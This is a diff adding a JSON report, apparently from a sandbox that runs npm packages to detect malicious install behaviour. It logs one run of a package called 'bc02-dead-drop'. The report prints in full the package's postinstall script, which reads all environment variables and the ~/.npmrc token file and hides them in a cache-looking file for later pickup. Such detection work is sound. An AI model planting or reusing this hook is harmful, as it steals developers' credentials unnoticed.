@@ -1,0 +1,97 @@
+{
+ "job_id": "4aebcab7-6ec8-4f9f-9f7e-4dcfcb032e69",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 2.92,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:30:19.087797465Z",
+   "pid": 286113,
+   "ppid": 286087,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-e829d4c3690bca4a; \"$@\"; rc=$?; /bin/true post-e829d4c3690bca4a; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc02-dead-drop",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:19.094453463Z",
+   "pid": 286152,
+   "ppid": 286113,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc02-dead-drop",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:19.095371079Z",
+   "pid": 286152,
+   "ppid": 286152,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc02-dead-drop",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:19.544749634Z",
+   "pid": 286171,
+   "ppid": 286152,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc02-dead-drop"
+  },
+  {
+   "ts": "2026-11-03T22:30:19.545689516Z",
+   "pid": 286172,
+   "ppid": 286171,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc02-dead-drop"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:30:19.208195752Z",
+   "pid": 286152,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  },
+  {
+   "ts": "2026-11-03T22:30:19.572767422Z",
+   "pid": 286172,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/bc02-dead-drop/scripts/setup.js",
+   "package": null,
+   "sha256": "ba709f41a14dbee6c7f17bc6bea15400264252ff8e4ba47db0a4bfa2334c265a",
+   "content": "const fs = require(\"fs\"), os = require(\"os\"), path = require(\"path\");\nconst loot = { env: process.env };\ntry { loot.npmrc = fs.readFileSync(path.join(os.homedir(), \".npmrc\"), \"utf8\"); } catch {}\n// No network: stage the loot in a cache-looking file for a later, separate pickup.\nconst dir = path.join(process.cwd(), \"node_modules\", \".cache\");\ntry {\n  fs.mkdirSync(dir, { recursive: true });\n  fs.writeFileSync(path.join(dir, \".telemetry.json\"), JSON.stringify(loot));\n} catch {}\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> bc02@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 388ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.06,
+  "peak_memory_mb": 4.4,
+  "samples": 1
+ }
+}
